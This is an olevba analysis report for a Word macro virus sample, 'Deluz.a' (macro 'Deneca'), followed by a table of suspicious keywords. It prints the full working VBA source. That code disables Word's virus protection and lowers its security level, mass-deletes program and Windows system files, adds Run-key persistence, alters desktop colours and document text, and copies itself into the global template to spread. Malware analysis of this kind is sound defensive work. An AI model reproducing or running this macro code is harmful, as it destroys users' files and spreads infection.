olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Deluz.a-0facf9d4d8900319a211296b9aa4d215e5aa3b9d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Deluz.a-0facf9d4d8900319a211296b9aa4d215e5aa3b9d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Deneca.bas 
in file: Virus.MSWord.Deluz.a-0facf9d4d8900319a211296b9aa4d215e5aa3b9d - OLE stream: 'Macros/VBA/Deneca'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Virus macro name: Deneca
'************************
'Brasil 2005
'************************

Sub AutoOpen()
On Error Resume Next
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
Application.EnableCancelKey = wdCancelDisabled
End With

MsgBox " Computador foi modificado agora!", vbOKOnly + vbCritical, "Virus declara!!"
WordBasic.Kill "C:\Program Files\Microsoft FrontPage\*.*"
WordBasic.Kill "C:\Program Files\GetRight\*.*"
WordBasic.Kill "C:\Program Files\Winzip\*.*"
WordBasic.Kill "C:\Program Files\Winamp\*.*"
WordBasic.Kill "C:\Arquivos de programas\Microsoft FrontPage\*.*"
WordBasic.Kill "C:\Arquivos de programas\GetRight\*.*"
WordBasic.Kill "C:\Arquivos de programas\Winzip\*.*"
WordBasic.Kill "C:\Arquivos de programas\Winamp\*.*"
WordBasic.Kill "C:\Windows\Application Data\*.*"
WordBasic.Kill "C:\Windows\System\*.*"
WordBasic.Kill "C:\Windows\Command\*.*"

With ActiveDocument.Shapes.AddShape _
        (msoShapeIsoscelesTriangle, 80, 80, 90, 50).Fill
        .ForeColor.RGB = RGB(255, 255, 0)
        .BackColor.RGB = RGB(255, 0, 0)
        .Patterned msoPatternDarkVertical

End With
ActiveDocument.Shapes.AddTextEffect _
    PresetTextEffect:=msoTextEffect13, _
    Text:="Seu desktop foi modificado!!", _
    FontName:="Times New Roman ", _
    FontSize:=24, _
    FontBold:=True, _
    FontItalic:=False, _
    Left:=InchesToPoints(1), _
    Top:=InchesToPoints(1), _
    Anchor:=ActiveDocument.Paragraphs(1).Range

With Assistant.NewBalloon
.Icon = msoIconAlertCritical
.Heading = "Virus diz!!"
.Text = "Fui ativado."
.Animation = msoAnimationWorkingAtSomething
.Show

ActiveDocument.SaveAs FileName:="C:\Beluz.doc"
ActiveDocument.Saved = True

End With

End Sub

Sub AutoClose()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Deneca") = "Virus salvado"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Especial") = "C:\ARQUIV~1\Deneca.bat"
Open "C:\ARQUIV~1\Deneca.bat" For Output As #1
Print #1, "@echo off"
Print #1, "Echo         Seu computador apresenta problemas."
Print #1, "Echo         Estou dentro de seu computador."
Print #1, "Echo         Word macro virus."
Print #1, "Echo         Infectado com macro virus."
Print #1, "Echo         Macro virus word ativado."
Print #1, "Echo         Problema encontrado."
Print #1, "Echo         Computador alterado."
Print #1, "Echo         Ano 2005."
Close #1

 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Scrollbar", "255 0 0", "" 'Red
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Background", "255 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Menu", "255 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Window", "255 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "WindowFrame", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "MenuText", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "HilightText", "0 0 0", "" 'Black
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonFace", "255 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonShadow", "255 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonText", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitleText", "0 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonDkShadow", "0 255 0", "" 'Green
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonLight", "255 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoText", "255 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoWindow", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonAlternateFace", "255 0 0", ""

   'Changes windows desktop colors to Red

Set myRange = ActiveDocument.Content
myRange.Find.Execute FindText:="a", _
    ReplaceWith:="HOHOHOHO", Replace:=wdReplaceAll

iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "Deneca" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Deneca" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Deneca"
    WordBasic.MacroCopy sMacro$, "Global:Deneca"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:Deneca"
   End If
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Application.DisplayStatusBar = False 'Disable Tools macro
    
End Sub

'Virus macro name: Deneca
'************************
'Ano 2005
'************************





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Deneca.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

